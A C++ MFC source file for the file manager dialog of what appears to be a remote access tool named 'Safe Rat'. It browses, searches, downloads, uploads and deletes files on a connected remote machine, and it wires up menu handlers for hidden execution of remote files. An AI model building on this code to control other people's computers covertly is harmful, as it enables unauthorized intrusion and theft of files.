// CFileManagerDlg.cpp: 实现文件
//

#include "pch.h"
#include "Safe Rat.h"
#include "CFileManagerDlg.h"
#include "afxdialogex.h"
#include "CFileTransferModeDlg.h"
#include "CInputDlg.h"


#define MAKEINT64(low, high) ((unsigned __int64)(((DWORD)(low)) | ((unsigned __int64)((DWORD)(high))) << 32))
#define WM_SHOW_MSG (WM_USER+101)
#define WM_SHOW_DLG (WM_USER+103)

UINT file_indicators[] =
{
	ID_SEPARATOR,           // status line indicator
	ID_SEPARATOR,
	ID_SEPARATOR
};

typedef struct
{
	DWORD	dwSizeHigh;
	DWORD	dwSizeLow;
}FILESIZE;

typedef struct
{
	char SearchFileName[MAX_PATH];
	char SearchPath[MAX_PATH];
	BOOL bEnabledSubfolder;
}FILESEARCH;

typedef struct {
	LVITEM* plvi;
	CString sCol2;
} lvItem, *plvItem;

BOOL DRIVE_Sys = FALSE;
BOOL DRIVE_CAZ = FALSE;

__int64	Bf_nCounters = 0;// 备份计数器  由于比较用
LONG	Bf_dwOffsetHighs = 0;
LONG	Bf_dwOffsetLows = 0;


// CFileManagerDlg 对话框

IMPLEMENT_DYNAMIC(CFileManagerDlg, CDialogEx)

CFileManagerDlg::CFileManagerDlg(CWnd* pParent /*=NULL*/, CHpTcpServer* pIOCPServer, ClientContext *pContext)
	: CDialogEx(IDD_FILE_DLG, pParent)
	, m_bSubFordle(FALSE)
	, m_SearchStr(_T(""))
{
	id_search_result = 0;

	m_iocpServer = pIOCPServer;
	m_pContext = pContext;
	m_hIcon = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDI_ICON_EXP));
	m_bOnClose = FALSE;

	//加载系统图标
	SHFILEINFO	sfi;
	HIMAGELIST hImageList;
	// 加载系统小图标列表
	hImageList = (HIMAGELIST)SHGetFileInfo((LPCTSTR)_T(""), 0, &sfi, sizeof(SHFILEINFO), SHGFI_SMALLICON | SHGFI_SYSICONINDEX);


	//获得桌面路径
	m_strDesktopPath = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(2);

	//启动路径
	m_strStartupPath = (TCHAR*)m_pContext->m_DeCompressionBuffer.GetBuffer(3+m_strDesktopPath.GetLength());

	//获取驱动器
	memset(m_bRemoteDriveList, 0, sizeof(m_bRemoteDriveList));
	memcpy(m_bRemoteDriveList, m_pContext->m_DeCompressionBuffer.GetBuffer(1 + 1 + (m_strDesktopPath.GetLength() + 1 + m_strStartupPath.GetLength()+1) * sizeof(TCHAR)),
		m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1 - 1 - (m_strDesktopPath.GetLength() + 1) * sizeof(TCHAR));

	m_hFileSend = INVALID_HANDLE_VALUE;
	m_hFileRecv = INVALID_HANDLE_VALUE;
	m_nTransferMode = TRANSFER_MODE_NORMAL;
	m_nOperatingFileLength = 0;
	m_nCounter = 0;
	DRIVE_Sys = FALSE;
	DRIVE_CAZ = FALSE;
	m_bIsStop = false;

}

CFileManagerDlg::~CFileManagerDlg()
{
	DestroyIcon(m_hIcon);

}

void CFileManagerDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialogEx::DoDataExchange(pDX);
	DDX_Control(pDX, IDC_REMOTE_PATH, m_Remote_Directory_ComboBox);
	DDX_Control(pDX, IDC_LIST_REMOTE, m_list_remote);
	DDX_Control(pDX, IDC_LIST_SEARCH, m_list_remote_search);
	DDX_Check(pDX, IDC_CHECK1, m_bSubFordle);
	DDX_Text(pDX, IDC_EDIT2, m_SearchStr);
	DDX_Control(pDX, IDC_BUTTON1, m_BtnSearch);
	DDX_Control(pDX, IDC_BUTTON2, m_s);
	DDX_Control(pDX, IDC_BUTTON3, m_w);
}


BEGIN_MESSAGE_MAP(CFileManagerDlg, CDialogEx)
	ON_WM_CLOSE()
	ON_MESSAGE(WM_SHOW_MSG, OnShowMessage)
	ON_NOTIFY(NM_DBLCLK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMDblclkListRemote)
	ON_CBN_SETFOCUS(IDC_REMOTE_PATH, &CFileManagerDlg::OnCbnSetfocusRemotePath)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_REMOTE, &CFileManagerDlg::OnNMRClickListRemote)
	ON_COMMAND(IDM_REFRESH, &CFileManagerDlg::OnRefresh)
	ON_COMMAND(IDM_REMOTE_OPEN_HIDE, &CFileManagerDlg::OnRemoteOpenHide)
	ON_COMMAND(IDM_TRANSFER_R, &CFileManagerDlg::OnTransferR)
	ON_COMMAND(IDM_DELETE, &CFileManagerDlg::OnDelete)
	ON_COMMAND(IDM_RENAME, &CFileManagerDlg::OnRename)

	ON_COMMAND(IDM_NEWFOLDER, &CFileManagerDlg::OnNewfolder)
	ON_COMMAND(IDM_TRANSFER_S, &CFileManagerDlg::OnTransferS)
	ON_WM_SIZE()
	ON_WM_QUERYDRAGICON()
ON_BN_CLICKED(IDC_BUTTON1, &CFileManagerDlg::OnBnClickedButton1)
ON_BN_CLICKED(IDC_BUTTON2, &CFileManagerDlg::OnBnClickedButton2)
ON_BN_CLICKED(IDC_BUTTON3, &CFileManagerDlg::OnBnClickedButton3)
ON_NOTIFY(NM_RCLICK, IDC_LIST_SEARCH, &CFileManagerDlg::OnNMRClickListSearch)
ON_COMMAND(ID_Menu32914, &CFileManagerDlg::OnHideRun)
END_MESSAGE_MAP()


// CFileManagerDlg 消息处理程序


void CFileManagerDlg::OnClose()
{
	m_iocpServer->Disconnect(m_pContext);
	m_bOnClose = TRUE;
	delete m_ProgressCtrl;
	CDialogEx::OnClose();
}


int CFileManagerDlg::initView()
{
	

	RECT	rect;
	GetClientRect(&rect);


	// 创建带度条的状态栏
	if (!m_wndStatusBar.Create(this) || !m_wndStatusBar.SetIndicators(file_indicators,sizeof(file_indicators) / sizeof(UINT)))
	{
		
		return -1;      // fail to create
	}

	m_wndStatusBar.SetPaneInfo(0, m_wndStatusBar.GetItemID(0), SBPS_STRETCH, NULL);
	m_wndStatusBar.SetPaneInfo(1, m_wndStatusBar.GetItemID(1), SBPS_NORMAL, 120);
	m_wndStatusBar.SetPaneInfo(2, m_wndStatusBar.GetItemID(2), SBPS_NORMAL, 50);

	RepositionBars(AFX_IDW_CONTROLBAR_FIRST, AFX_IDW_CONTROLBAR_LAST, 0); //显示状态栏	

	
	m_wndStatusBar.GetItemRect(1, &rect);

	m_ProgressCtrl = new CXTPProgressCtrl;
	m_ProgressCtrl->Create(PBS_SMOOTH | WS_VISIBLE, rect, &m_wndStatusBar, 1);
	m_ProgressCtrl->SetTheme(xtpControlThemeOfficeXP);
	m_ProgressCtrl->SetRange(0, 100);           //设置进度条范围
	m_ProgressCtrl->SetPos(100);                 //设置进度条当前位置
	
	FixedRemoteDriveList();



	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(NULL, &hImageListSmall);
	//给搜索列表设置图标
	ListView_SetImageList(m_list_remote_search.m_hWnd, hImageListSmall, LVSIL_SMALL);



	//设置搜索list表头
	m_list_remote_search.ShowWindow(SW_HIDE);
	m_list_remote_search.InsertColumn(0, _T("文件名"), LVCFMT_LEFT, 130);
	m_list_remote_search.InsertColumn(1, _T("大小"), LVCFMT_LEFT, 100);
	m_list_remote_search.InsertColumn(2, _T("修改日期"), LVCFMT_LEFT, 100);
	m_list_remote_search.InsertColumn(3, _T("文件路径"), LVCFMT_LEFT, 270);


	SetWindowPos(NULL, 0, 0, 600, 435, SWP_NOMOVE);

	return TRUE;
}

//显示远程驱动器
void CFileManagerDlg::FixedRemoteDriveList()
{
	
	DRIVE_Sys = FALSE;

	MyShell_GetImageLists();
	ListView_SetImageList(m_list_remote.m_hWnd, I_ImageList0, LVSIL_NORMAL);  //大图标
	ListView_SetImageList(m_list_remote.m_hWnd, I_ImageList1, LVSIL_SMALL);   //列表图标

	m_list_remote.DeleteAllItems();
	// 重建Column
	while (m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, _T("名称"), LVCFMT_LEFT, 250);
	m_list_remote.InsertColumn(1, _T("类型"), LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, _T("总大小"), LVCFMT_LEFT, 125);
	m_list_remote.InsertColumn(3, _T("可用空间"), LVCFMT_LEFT, 115);

	BYTE* pDrive = NULL;
	pDrive = (BYTE*)m_bRemoteDriveList;

	int		AmntMB = 0; // 总大小
	int		FreeMB = 0; // 剩余空间


	int	nIconIndex = -1;
	//用一个循环遍历所有发送来的信息，先是到列表中
	for (int i = 0; pDrive[i] != '\0';)
	{
		//由驱动器名判断图标的索引
		if (pDrive[i] == _T('A') || pDrive[i] == _T('B'))
		{
			nIconIndex = 0;
		}
		else
		{
			switch (pDrive[i + 2])
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 3;
				break;
			case DRIVE_FIXED:
				if (!DRIVE_Sys)
				{
					DRIVE_Sys = TRUE;
					nIconIndex = 1;
				}
				else
					nIconIndex = 2;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 4;
				break;
			case DRIVE_CDROM:
				nIconIndex = 5;
				break;
			default:
				nIconIndex = 2;
				break;
			}
		}
		//显示驱动器名
		CString	str;
		str.Format(_T("%c:\\"), pDrive[i]);
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);
		m_list_remote.SetItemData(nItem, 1);
		//显示驱动器大小
		memcpy(&AmntMB, pDrive + i + 4, 4);
		memcpy(&FreeMB, pDrive + i + 8, 4);
		str.Format(_T("%12.1f GB"), (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format(_T("%10.1f GB"), (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);

		i += 12;

		TCHAR* lpFileSystemName = NULL;
		TCHAR* lpTypeName = NULL;

		lpTypeName = (TCHAR*)(pDrive + i);
		i += (lstrlen(lpTypeName) + 1) * sizeof(TCHAR);
		lpFileSystemName = (TCHAR*)(pDrive + i);

		// 磁盘类型, 为空就显示磁盘名称
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += (lstrlen(lpFileSystemName) + 1) * sizeof(TCHAR);
	}
	// 重置远程当前路径
	m_Remote_Path = "";
	m_Remote_Directory_ComboBox.ResetContent();

	m_Remote_Directory_ComboBox.InsertString(0, m_strDesktopPath);
	m_Remote_Directory_ComboBox.InsertString(1, m_strStartupPath);

	DRIVE_CAZ = FALSE;


	//设置状态栏消息
	strShowText.Format(_T("远程计算机：磁盘列表"));
	PostMessage(WM_SHOW_MSG, 0, 0);
	
}

BOOL CFileManagerDlg::OnInitDialog()
{
	CDialogEx::OnInitDialog();

	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

	if (initView() < 0) return -1;

	CString str;
	str.Format("%s - 文件管理", m_pContext->m_RemoteIP);
	SetWindowText(str);


	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}
//显示状态栏消息
LRESULT CFileManagerDlg::OnShowMessage(WPARAM wParam, LPARAM lParam)
{
	m_wndStatusBar.SetPaneText(0, strShowText);
	return TRUE;
}

void CFileManagerDlg::OnReceiveComplete()
{
	if (m_bOnClose) 	return;

	switch (m_pContext->m_DeCompressionBuffer.GetBuffer(0)[0])
	{
		case TOKEN_FILE_LIST: // 文件列表
			FixedRemoteFileList(m_pContext->m_DeCompressionBuffer.GetBuffer(0), m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1);
			break;
		case TOKEN_FILE_SIZE:						//传输文件时的第一个数据包，文件大小，及文件名
			CreateLocalRecvFile();
			break;
		case TOKEN_TRANSFER_FINISH:					// 传输完成
			EndLocalRecvFile();	
			break;
		case TOKEN_FILE_DATA:						// 文件内容
			WriteLocalRecvFile();
			break;
		case TOKEN_DELETE_FINISH:					//删除完成
			EndRemoteDeleteFile();
			break;
		case TOKEN_RENAME_FINISH:					//重命名完成
		case TOKEN_CREATEFOLDER_FINISH:				//新建文件夹完成
			GetRemoteFileList(_T(".")); 			// 刷新远程文件列表
			break;
		case TOKEN_GET_TRANSFER_MODE:				//请求设置文件上传模式
			SendTransferMode();
			break;
		case TOKEN_DATA_CONTINUE:					//请求上传的具体数据
			SendFileData();    //文件上传数据
			break;
		case TOKEN_SEARCH_FILE_LIST:
			FixedRemoteSearchFileList
			(
				m_pContext->m_DeCompressionBuffer.GetBuffer(0),
				m_pContext->m_DeCompressionBuffer.GetBufferLen() - 1
			);
			break;
		case TOKEN_SEARCH_FILE_FINISH:
			SearchEnd();
			break;
	}

}


//显示搜索
void CFileManagerDlg::FixedRemoteSearchFileList(BYTE* pbBuffer, DWORD dwBufferLen)
{
	byte* pList = pbBuffer + 1;
	int		nItemIndex = 0;
	for (byte* pBase = pList; (int)(pList - pBase) < (int)(dwBufferLen - 1);)
	{
		TCHAR* pszFileName = NULL;
		DWORD	dwFileSizeHigh = 0;
		DWORD	dwFileSizeLow = 0;
		FILETIME	ftm_strReceiveLocalFileTime;
		int		nItem = 0;
		bool	bIsInsert = false;
		int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;

		pszFileName = (TCHAR*) ++pList;

		CString csFilePath, csFileFullName;
		csFilePath.Format(_T("%s"), pszFileName);
		int nPos = csFilePath.ReverseFind(_T('\\'));
		csFileFullName = csFilePath.Right(csFilePath.GetLength() - nPos - 1);// 获取文件全名，包括文件名和扩展名   

		nItem = m_list_remote_search.InsertItem(nItemIndex++, csFileFullName, GetIconIndex(pszFileName, nType));
		m_list_remote_search.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);

		pList += (lstrlen(pszFileName) + 1) * sizeof(TCHAR);

		memcpy(&dwFileSizeHigh, pList, 4);
		memcpy(&dwFileSizeLow, pList + 4, 4);
		CString strSize;
		strSize.Format(_T("%10d KB"), (dwFileSizeHigh * (MAXDWORD)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));

		m_list_remote_search.SetItemText(nItem, 1, strSize);
		memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
		CTime	time(ftm_strReceiveLocalFileTime);
		m_list_remote_search.SetItemText(nItem, 2, time.Format(_T("%Y-%m-%d %H:%M")));

		PathRemoveFileSpec(pszFileName); //去除文件名获取文件路径
		m_list_remote_search.SetItemText(nItem, 3, pszFileName);

		pList += 16;
	}

	m_ProgressCtrl->StepIt();

}

//搜索完成
void CFileManagerDlg::SearchEnd()
{
	int len = m_list_remote_search.GetItemCount();
	m_BtnSearch.SetWindowText(_T("重新搜索"));

	//设置状态栏消息
	strShowText.Format(_T("搜索完毕 共：%d 个文件"), len);
	PostMessage(WM_SHOW_MSG, 0, 0);
	m_ProgressCtrl->SetPos(100);
	m_list_remote_search.EnableWindow(TRUE);
	(CButton*)GetDlgItem(IDC_BUTTON1)->EnableWindow(TRUE);
	(CButton*)GetDlgItem(IDC_BUTTON2)->EnableWindow(FALSE);
}

void CFileManagerDlg::EndLocalUploadFile()
{
	m_nCounter = 0;
	m_strOperatingFile = _T("");
	m_nOperatingFileLength = 0;

	if (m_hFileSend != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileSend);
		m_hFileSend = INVALID_HANDLE_VALUE;
	}
	SendStop(FALSE); // 发了之后, 被控端才会关闭句柄

	if (m_Remote_Upload_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Upload_Job.RemoveAll();
		EnableControl(TRUE);
		GetRemoteFileList(_T("."));
		m_ProgressCtrl->SetWindowText("");
		strShowText.Format(_T("远程：装载目录 %s\\*.* 完成"), m_Remote_Path);
		PostMessage(WM_SHOW_MSG, 0, 0);
		m_bIsStop = false;
		DRIVE_CAZ = TRUE;
	}
	else
	{
		Sleep(5);
		SendUploadJob();
	}
	return;


}


void CFileManagerDlg::SendFileData()
{
	FILESIZE* pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();

	if (m_nCounter == m_nOperatingFileLength || (dwOffsetHigh == -1 && dwOffsetLow == -1) || m_bIsStop)
	{
		EndLocalUploadFile();
		return;
	}

	SetFilePointer(m_hFileSend, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9

	int dwDownFileSize = GetFileSize(m_hFileSend, NULL);

	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;
	DWORD	nNumberOfBytesRead = 0;

	BYTE* lpBuffer = (BYTE*)LocalAlloc(LPTR, MAX_SEND_BUFFER);
	// Token,  大小，偏移，数据
	lpBuffer[0] = COMMAND_FILE_DATA;
	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));
	// 返回值
	bool	bRet = true;
	ReadFile(m_hFileSend, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	//CloseHandle(m_hFileSend); // 此处不要关闭, 以后还要用

	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
	LocalFree(lpBuffer);

}

void CFileManagerDlg::SendTransferMode()
{
	CFileTransferModeDlg	dlg(this);
	dlg.m_strFileName = m_strUploadRemoteFile;
	switch (dlg.DoModal())
	{
	case IDC_OVERWRITE:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case IDC_OVERWRITE_ALL:
		m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
		break;
	case IDC_ADDITION:
		m_nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case IDC_ADDITION_ALL:
		m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
		break;
	case IDC_JUMP:
		m_nTransferMode = TRANSFER_MODE_JUMP;
		break;
	case IDC_JUMP_ALL:
		m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
		break;
	case IDC_CANCEL:
		m_nTransferMode = TRANSFER_MODE_CANCEL;
		break;
	}
	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		m_bIsStop = true;
		EndLocalUploadFile();
		return;
	}

	BYTE bToken[5];
	bToken[0] = COMMAND_SET_TRANSFER_MODE;
	memcpy(bToken + 1, &m_nTransferMode, sizeof(m_nTransferMode));
	m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
}


//删除完成
void CFileManagerDlg::EndRemoteDeleteFile()
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(_T("."));
		DWORD_PTR dwResult;
		if (m_strFileName.GetAt(m_strFileName.GetLength() - 1) == '\\')
		{
			//设置状态栏消息
			strShowText.Format(_T("删除目录：%s (完成)"), m_strFileName);
			PostMessage(WM_SHOW_MSG, 0, 0);
		}
		else
		{
			//设置状态栏消息
			strShowText.Format(_T("删除文件：%s (完成)"), m_strFileName);
			PostMessage(WM_SHOW_MSG, 0, 0);
		}
		DRIVE_CAZ = TRUE;
	}
	else
	{
		Sleep(5);
		SendDeleteJob();
	}
	return;

}

//写入本地
void CFileManagerDlg::WriteLocalRecvFile()
{
	// 传输完毕
	BYTE* pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite = 0;
	int		nHeadLength = 9; // 1 + 4 + 4  数据包头部大小，为固定的9
	FILESIZE* pFileSize;
	// 得到数据的偏移
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE*)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// 得到数据在文件中的偏移, 赋值给计数器
	//m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;
	// 得到数据在文件中的偏移, 赋值给计数器
	m_nCounter = MAKEINT64(dwOffsetLow, dwOffsetHigh);

	if (m_nCounter < 0)   //数据出错 返回上传传送数据
	{
		m_nCounter = Bf_nCounters;
		dwOffsetHigh = Bf_dwOffsetHighs;
		dwOffsetLow = Bf_dwOffsetLows;
	}
	else
	{
		Bf_nCounters = m_nCounter;
		Bf_dwOffsetHighs = dwOffsetHigh;
		Bf_dwOffsetLows = dwOffsetLow;

		dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

		SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

		BOOL bResult = FALSE;
		int i = 0;
		for (i = 0; i < MAX_WRITE_RETRY; i++)
		{
			// 写入文件
			bResult = WriteFile(m_hFileRecv, pData, dwBytesToWrite, &dwBytesWrite, NULL);
			if (bResult)
				break;
		}
		if (i == MAX_WRITE_RETRY && !bResult)
		{
			::MessageBox(m_hWnd, m_strReceiveLocalFile + _T(" 文件写入失败"), _T("警告"), MB_OK | MB_ICONWARNING);
		}
		dwOffsetLow = 0; dwOffsetHigh = 0;
		dwOffsetLow = SetFilePointer(m_hFileRecv, dwOffsetLow, &dwOffsetHigh, FILE_CURRENT);
		//CloseHandle(m_hFileRecv); // 此处不要关闭, 以后还要用
		// 为了比较，计数器递增
		m_nCounter += dwBytesWrite;
		ShowProgress();
	}
	if (m_bIsStop)
		SendStop(TRUE);
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}

//传输完成
void CFileManagerDlg::EndLocalRecvFile()
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_hFileRecv != INVALID_HANDLE_VALUE)
	{
		CloseHandle(m_hFileRecv);
		m_hFileRecv = INVALID_HANDLE_VALUE;
	}

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		// 重置传输方式
		m_nTransferMode = TRANSFER_MODE_NORMAL;
		EnableControl(TRUE);
		DWORD_PTR dwResult;
		if (m_bIsStop)
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)_T(" 取消下载"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
		}
		else
		{
			SendMessageTimeout(m_wndStatusBar.GetSafeHwnd(), SB_SETTEXT, 2,
				(LPARAM)_T(" 全部完成"), SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
		}
		m_bIsStop = false;
	}
	else
	{
		// 我靠，不sleep下会出错，服了可能以前的数据还没send出去
		Sleep(10);
		SendDownloadJob();
	}

	return;

}

//创建嵌套目录
bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;

	// Make a copy of the string for editing.
	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if (pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		//  If the second character in the path is "\", then this is a UNC
		//  path, and we should skip forward until we reach the 2nd \ in the path.

		if ((*p == TEXT('\\')) && (*(p + 1) == TEXT('\\')))
		{
			p++;            // Skip over the first \ in the name.
			p++;            // Skip over the second \ in the name.

			//  Skip until we hit the first "\" (\\Server\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it.

			if (*p)
			{
				p++;
			}

			//  Skip until we hit the second "\" (\\Server\Share\).

			while (*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			// Advance over it also.

			if (*p)
			{
				p++;
			}

		}
		else if (*(p + 1) == TEXT(':')) // Not a UNC.  See if it's <drive>:
		{
			p++;
			p++;

			// If it exists, skip over the root specifier

			if (*p && (*p == TEXT('\\')))
			{
				p++;
			}
		}

		while (*p)
		{
			if (*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);

				// Nothing exists with this name.  Try to make the directory name and error if unable to.
				if (dwAttributes == 0xffffffff)
				{
					if (!CreateDirectory(pszDirCopy, NULL))
					{
						if (GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if ((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						// Something exists with this name, but it's not a directory... Error
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except (EXCEPTION_EXECUTE_HANDLER)
	{
		// SetLastError(GetExceptionCode());
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;

}

//创建本地文件用于保存
void CFileManagerDlg::CreateLocalRecvFile()
{
	// 重置计数器
	m_nCounter = 0;

	FILESIZE* pFileSize = (FILESIZE*)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = ((__int64)dwSizeHigh << 32) + dwSizeLow;

	// 当前正操作的文件名
	m_strOperatingFile = (TCHAR*)(m_pContext->m_DeCompressionBuffer.GetBuffer(9));


	m_strReceiveLocalFile = m_strOperatingFile;

	// 得到要保存到的本地的文件路径
	m_strReceiveLocalFile.Replace(m_Remote_Path, strLpath);
	m_strFileName = m_strReceiveLocalFile;

	// 创建多层目录
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));

	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);

	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL
		&& m_nTransferMode != TRANSFER_MODE_ADDITION_ALL
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{
		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_ADDITION:
			m_nTransferMode = TRANSFER_MODE_ADDITION;
			break;
		case IDC_ADDITION_ALL:
			m_nTransferMode = TRANSFER_MODE_ADDITION_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDC_CANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}

	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// 取消传送
		m_bIsStop = true;
		SendStop(TRUE);
		FindClose(hFind);
		return;
	}

	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_ADDITION_ALL:
		nTransferMode = TRANSFER_MODE_ADDITION;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//  1字节Token,四字节偏移高四位，四字节偏移低四位
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // 文件打开方式 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;

	// 文件已经存在
	if (hFind != INVALID_HANDLE_VALUE)
	{
		// 提示点什么
		// 如果是续传
		if (nTransferMode == TRANSFER_MODE_ADDITION)
		{
			memcpy(bToken + 1, &FindFileData.nFileSizeHigh, 4);
			memcpy(bToken + 5, &FindFileData.nFileSizeLow, 4);
			// 接收的长度递增
			m_nCounter += (__int64)FindFileData.nFileSizeHigh << 32;
			m_nCounter += FindFileData.nFileSizeLow;

			dwCreationDisposition = OPEN_EXISTING;
		}
		// 覆盖
		else if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// 偏移置0
			memset(bToken + 1, 0, 8);
			// 重新创建
			dwCreationDisposition = CREATE_ALWAYS;

		}
		// 跳过，指针移到-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			DWORD dwOffset = -1;
			memcpy(bToken + 1, &dwOffset, 4);
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
			DWORD_PTR dwResult;
			SendMessageTimeout(m_ProgressCtrl->GetSafeHwnd(), PBM_SETPOS, 100, 0, SMTO_ABORTIFHUNG | SMTO_BLOCK, 500, &dwResult);
		}
	}
	else
	{
		// 偏移置0
		memset(bToken + 1, 0, 8);
		// 重新创建
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	if (m_hFileRecv != INVALID_HANDLE_VALUE)
		CloseHandle(m_hFileRecv);
	m_hFileRecv = CreateFile(m_strReceiveLocalFile.GetBuffer(0),
